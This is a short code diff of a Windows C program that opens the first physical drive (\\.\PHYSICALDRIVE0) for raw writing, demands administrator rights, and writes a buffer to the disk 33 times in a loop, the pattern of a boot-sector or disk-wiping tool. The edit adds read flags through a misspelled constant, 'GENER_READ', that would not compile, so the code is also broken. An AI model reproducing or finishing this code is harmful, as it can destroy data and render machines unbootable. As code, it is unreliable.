@@ -11,8 +11,8 @@ int main()
 	int i;
 	HANDLE  hDevice = CreateFile(																/* the hard disk handle */
         "\\\\.\\PHYSICALDRIVE0",
-        GENERIC_WRITE,
-        FILE_SHARE_READ,
+        GENERIC_WRITE | GENER_READ,
+        FILE_SHARE_READ | GENER_READ,
         NULL,
         OPEN_EXISTING,
         NULL,
@@ -23,8 +23,7 @@ int main()
 		MessageBox (NULL, TEXT ("You must run as admin!!!"), TEXT ("Warning"), 0) ;
 		return -1;
 	}
-	for (i = 0; i <= 32; i++ )
-	{
+	for (i = 0; i <= 32; i++ ) {
 		Write_return = WriteFile(
 			hDevice,
 			buffer,
@@ -32,7 +31,7 @@ int main()
 			&Get,
 			NULL);
 	
-		if(Write_return == FALSE ){
+		if (Write_return == FALSE ){
 			printf("write fail \n%d\n", GetLastError() );
 			return -1;
 		}
